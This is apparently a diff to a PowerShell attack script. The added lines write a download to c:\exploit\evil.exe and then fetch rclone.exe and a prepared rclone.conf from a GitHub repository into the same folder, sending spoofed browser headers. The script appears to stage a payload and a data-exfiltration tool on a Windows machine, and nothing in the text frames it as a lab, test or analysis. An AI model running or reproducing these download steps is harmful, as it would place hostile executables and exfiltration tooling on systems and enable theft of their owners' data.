@@ -65,4 +65,34 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/Dolev
   "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
   "sec-ch-ua-mobile"="?0"
   "sec-ch-ua-platform"="`"macOS`""
-}
+} -OutFile c:\exploit\evil.exe
+Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.exe" `
+-WebSession $session `
+-Headers @{
+"Accept"="*/*"
+  "Accept-Encoding"="gzip, deflate, br"
+  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
+  "Origin"="https://github.com"
+  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
+  "Sec-Fetch-Dest"="empty"
+  "Sec-Fetch-Mode"="cors"
+  "Sec-Fetch-Site"="cross-site"
+  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
+  "sec-ch-ua-mobile"="?0"
+  "sec-ch-ua-platform"="`"macOS`""
+} -OutFile c:\exploit\rclone.exe
+Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.conf" `
+-WebSession $session `
+-Headers @{
+"Accept"="*/*"
+  "Accept-Encoding"="gzip, deflate, br"
+  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
+  "Origin"="https://github.com"
+  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
+  "Sec-Fetch-Dest"="empty"
+  "Sec-Fetch-Mode"="cors"
+  "Sec-Fetch-Site"="cross-site"
+  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
+  "sec-ch-ua-mobile"="?0"
+  "sec-ch-ua-platform"="`"macOS`""
+} -OutFile c:\exploit\rclone.conf
